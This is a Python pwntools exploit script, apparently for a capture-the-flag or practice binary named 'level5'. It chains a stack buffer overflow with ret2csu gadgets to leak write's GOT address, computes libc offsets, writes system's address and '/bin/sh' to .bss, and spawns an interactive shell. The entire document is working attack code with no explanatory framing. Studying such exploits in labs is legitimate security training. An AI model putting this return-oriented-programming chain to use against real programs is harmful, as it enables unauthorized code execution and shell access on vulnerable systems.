#!/usr/bin/env python
from pwn import *
sys.path.append('/home/li/Desktop/LibcSearcher')
from LibcSearcher import LibcSearcher

r = process('./rop/level5')
elf = ELF('./rop/level5')

write_got = elf.got['write']
read_got = elf.got['read']
main_adr = elf.symbols['_start']
bss_adr = elf.bss()
csu_front_adr = 0x00000000004005F0
csu_last_adr = 0x0000000000400606
fackebp = b'A' * 8
ret_adr = 0x400417  

def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = b'A' * 128 + fackebp
    payload += p64(csu_last_adr)
    payload += p64(0)
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(csu_front_adr)
    payload += b'A' * 56
    payload += p64(last)
    r.send(payload)
    sleep(1)

def align_rsp():
    r.send(b'A' * (128 + len(fackebp)) + p64(ret_adr))

gdb.attach(r, '''
    break *0x400417  # Breakpoint at system call or another significant point
    continue
''')

r.recvuntil(b'Hello, World\n')
print("send payload first")
csu(0, 1, write_got, 1, write_got, 8, main_adr)

write_adr = u64(r.recv(8))
print("write_adr: ", hex(write_adr))
write_libc = 0xe6870
system_libc = 0x40950
offset = write_adr - write_libc
system_adr = offset + system_libc

align_rsp()  # Ensure the stack is 16-byte aligned before calling 'system'
r.recvuntil(b'Hello, World\n')
print("send payload second")
csu(0, 1, read_got, 0, bss_adr, 16, main_adr)
r.send(p64(system_adr) + b"/bin/sh\x00")

align_rsp()  # Again, align the stack
r.recvuntil(b'Hello, World\n')
print("send payload third")
csu(0, 1, bss_adr, bss_adr + 8, 0, 0, main_adr)
r.interactive()
